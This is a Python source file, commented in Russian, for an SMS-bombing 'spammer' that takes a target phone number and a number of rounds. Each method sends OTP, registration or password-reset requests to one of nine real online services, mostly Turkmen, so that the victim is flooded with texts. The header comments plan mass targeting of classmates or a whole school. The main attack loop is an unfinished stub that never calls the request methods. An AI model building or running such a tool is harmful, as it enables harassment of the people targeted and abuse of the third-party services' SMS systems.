
# Итогово сервисов: 9
# Скорость спама: есть к чему стремиться.

# Будущие обновления:
# • Возможность массовой рассылки по номерам. Пример: сидишь в классе, заходишь в спамер и нажимаешь на нужный режим. После вводишь номера своих одноклассников (можно хоть всего класса, если имеются (да хоть всей школы, хаха)), дальше наслаждаешься проделанной работой, ну это так, пустяки, мы то с тобой будем преследовать куда более крупные задачи. ;)
# • Улучшение скорости.

import requests
from colorama import Back, Fore, init
import json
import time
from threading import Thread


class Spammer:
    
	def __init__(self):
		init(autoreset=True)
		self.phone_num = [] # Для будущих обновлений.

		self.phones = int(input(Back.RED + "Введите номер: "))
		self.tries = int(input(Back.GREEN + "Введите кол-во кругов: "))


	def attack(self):
		while self.tries != 0:
			ph = str(self.phones)
			p_s = ph[3:]

			self.tries -= 1


	def belet(self, phone):
		r = requests.post("https://api.belet.me/api/v1/auth/sign-in",
		json = {"phone":phone,"fingerprint":"110aec2bfcca53e0793f5973e5b86926"})
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
	    

	def gipertm(self, phone):
		r = requests.post("https://gipertm.com/api/v1/profile/register", 
		json = {"lang":"tk", "username":str(phone)})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
			

	def asman_express(self, phone):
		r = requests.post("https://shop-adm.asmanexpress.com/api/customers/auth/otp?type=register", 
		json = {"phone":str(phone)})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")


	def nesipetsin(self, phone):
		r = requests.post("https://nesipetsin.com:7070/nesipetsin/mobile/user/register",
		json = {"method":"phone","step":1,"phone":phone[3:],"email":"null","code":"null","password":"null","confirmPassword":"null","errorMsg":"null"})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")


	def saraytm(self, phone):
		r = requests.get("https://saray.tm/verify?phone=" + phone[3:] + "&terms=accept")
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")


	def awtoyoly(self, phone):
		r = requests.post("http://awtoyoly.com.tm/Client/AwtoCheckLogin",
		data = {"phone":phone[3:]})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")


	def ynamdar(self, phone):
		r = requests.post("https://ynamdar.com/v3/forgot_password", 
		data = {"registration-type": "phone", "phone": phone[3:], "action": "send-confirmation-code"})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")


	def markayoly(self, phone):
		r = requests.post("https://api.markayoly.com/api/start-signup",
		json = {"phone":phone[3:]})
		
		if r.status_code == 200:
		    print(Fore.GREEN + "Сообщение отправлено.")



if __name__ == "__main__":
	pass
		
